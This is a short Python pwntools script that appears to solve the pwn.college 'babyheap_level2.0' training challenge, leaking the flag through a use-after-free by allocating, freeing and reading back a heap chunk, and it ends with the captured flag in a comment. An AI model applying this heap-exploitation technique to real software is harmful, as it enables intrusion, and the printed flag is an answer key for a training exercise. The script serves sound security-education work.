from pwn import *

s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyheap_level2.0")

io.sendlineafter(b": ", b"malloc")
io.sendlineafter(b"Size: ", b'215')
io.sendlineafter(b": ", b"free")
io.sendlineafter(b": ", b"read_flag")
io.sendlineafter(b": ", b"puts")

io.recvuntil(b'Data: ')
flag = io.recvline().decode()
s.close()

info("Flag: " + flag)
# Flag: pwn.college{E_itRsFc7JZDsWaKgZ-WozbYO8y.01M3MDLxIjNyEzW}